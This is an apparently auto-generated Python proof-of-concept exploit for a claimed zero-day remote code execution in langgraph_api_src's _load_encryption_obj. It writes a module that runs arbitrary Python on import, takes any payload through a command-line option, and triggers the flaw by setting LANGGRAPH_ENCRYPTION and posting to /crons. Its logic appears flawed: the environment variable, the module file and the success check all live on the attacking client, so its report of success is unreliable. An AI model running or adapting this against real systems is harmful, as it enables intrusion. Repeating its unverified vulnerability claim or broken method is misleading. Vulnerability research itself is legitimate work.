#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-038
# Sink: _load_encryption_obj
# Auto-generated — run with: python3 rce_load_encryption_obj_function__load_encryption_obj_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for RCE in langgraph_api_src
Vulnerability: _load_encryption_obj loads arbitrary Python modules from user-controlled path
CVE: N/A (0-day)
Author: Security Research
"""

import os
import sys
import json
import time
import argparse
import tempfile
import requests
from typing import Optional

# Configuration
TARGET_URL = "http://localhost:8123"  # Default langgraph API port
TIMEOUT = 10
VERIFY_SSL = False  # Set to True if using valid certificates

# Benign payload that creates a marker file to prove RCE
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

# Malicious payload for demonstration (commented out by default)
# MALICIOUS_PAYLOAD = """
# import os
# os.system('id > /tmp/pwned.txt')
# """


def create_malicious_module(payload: str) -> str:
    """
    Create a temporary Python module that will be loaded by the vulnerable function.
    
    Args:
        payload: Python code to execute when module is loaded
        
    Returns:
        Path to the created module file
    """
    # Create a temporary directory for our malicious module
    temp_dir = tempfile.mkdtemp(prefix="lg_exploit_")
    
    # Create the malicious module file
    module_path = os.path.join(temp_dir, "exploit_module.py")
    
    # The module must export an Encryption instance to pass the isinstance check
    # We create a minimal Encryption class that executes our payload on import
    module_content = f"""
# Malicious encryption module - executes payload on import
import os
import sys

# Execute the payload immediately when module is loaded
{payload}

# Create a minimal Encryption class to pass validation
class Encryption:
    def __init__(self):
        self.name = "malicious_encryption"
    
    def encrypt(self, data: bytes) -> bytes:
        return data
    
    def decrypt(self, data: bytes) -> bytes:
        return data

# Export the instance that will be returned by _load_encryption_obj
encryption = Encryption()
"""
    
    with open(module_path, 'w') as f:
        f.write(module_content)
    
    print(f"[+] Created malicious module at: {module_path}")
    return module_path


def trigger_exploit(target_url: str, module_path: str) -> bool:
    """
    Trigger the RCE by setting the LANGGRAPH_ENCRYPTION environment variable
    and making a request that causes the vulnerable code path to execute.
    
    The exploit works by:
    1. Setting LANGGRAPH_ENCRYPTION to point to our malicious module
    2. Making a request that triggers encryption context building
    3. The vulnerable _load_encryption_obj function loads and executes our module
    
    Args:
        target_url: Base URL of the langgraph API
        module_path: Path to the malicious Python module
        
    Returns:
        True if exploit appears successful, False otherwise
    """
    # The path format expected by _load_encryption_obj: "./path/to/file.py:name"
    # We use "encryption" as the exported name (matches our module)
    encryption_path = f"{module_path}:encryption"
    
    # Set the environment variable that controls the encryption path
    # This is how an attacker would configure the vulnerable parameter
    os.environ['LANGGRAPH_ENCRYPTION'] = json.dumps({
        'path': encryption_path
    })
    
    print(f"[*] Set LANGGRAPH_ENCRYPTION to: {encryption_path}")
    print("[*] Making request to trigger encryption context loading...")
    
    # Make a request that will trigger the vulnerable code path
    # The update endpoint calls build_encryption_context which eventually
    # calls _load_encryption_obj with our controlled path
    try:
        # First, let's try to access the API to see if it's running
        response = requests.get(
            f"{target_url}/health",
            timeout=TIMEOUT,
            verify=VERIFY_SSL
        )
        print(f"[*] Health check response: {response.status_code}")
        
        # Now make a request that triggers the encryption loading
        # The exact endpoint depends on the API version, but any request
        # that goes through the encryption middleware should work
        headers = {
            'Content-Type': 'application/json',
            'X-Encryption-Context': '{"test": "value"}'
        }
        
        # Try to create a cron job (this triggers the vulnerable path)
        cron_data = {
            "schedule": "0 0 * * *",
            "payload": {"test": "data"},
            "metadata": {"key": "value"}
        }
        
        response = requests.post(
            f"{target_url}/crons",
            headers=headers,
            json=cron_data,
            timeout=TIMEOUT,
            verify=VERIFY_SSL
        )
        
        print(f"[*] Trigger request response: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if our payload executed
        if os.path.exists('/tmp/poc_success.txt'):
            print("[+] SUCCESS! Payload executed - /tmp/poc_success.txt created")
            return True
        else:
            print("[*] Payload marker not found, but exploit may have executed")
            print("[*] Check server logs for evidence of code execution")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("[*] Make sure the target server is running")
        return False
    except requests.exceptions.Timeout:
        print(f"[-] Timeout: Request to {target_url} timed out")
        return False
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        return False


def cleanup(module_path: str):
    """
    Clean up temporary files created during exploitation.
    
    Args:
        module_path: Path to the malicious module to remove
    """
    try:
        if module_path and os.path.exists(module_path):
            os.remove(module_path)
            # Also try to remove the parent directory
            parent_dir = os.path.dirname(module_path)
            if parent_dir and os.path.exists(parent_dir):
                os.rmdir(parent_dir)
            print(f"[+] Cleaned up: {module_path}")
    except Exception as e:
        print(f"[-] Cleanup warning: {e}")


def main():
    """Main exploit function."""
    parser = argparse.ArgumentParser(
        description="PoC Exploit for langgraph_api_src RCE via _load_encryption_obj"
    )
    parser.add_argument(
        "-t", "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-p", "--payload",
        default=BENIGN_PAYLOAD,
        help="Python code to execute (default: create /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't clean up temporary files after exploit"
    )
    
    args = parser.parse_args()
    
    print("[*] langgraph_api_src RCE Exploit PoC")
    print("[*] ==================================")
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload: {args.payload[:100]}...")
    
    # Create the malicious module
    module_path = create_malicious_module(args.payload)
    
    try:
        # Trigger the exploit
        success = trigger_exploit(args.target, module_path)
        
        if success:
            print("[+] Exploit completed successfully!")
            print("[*] Check /tmp/poc_success.txt on the target server")
        else:
            print("[-] Exploit may not have succeeded")
            print("[*] Possible reasons:")
            print("[*] 1. Target is not running langgraph API")
            print("[*] 2. The vulnerable code path is not exposed")
            print("[*] 3. The server has additional protections")
            
    finally:
        # Clean up
        if not args.no_cleanup:
            cleanup(module_path)
        else:
            print(f"[*] Temporary module left at: {module_path}")


if __name__ == "__main__":
    main()
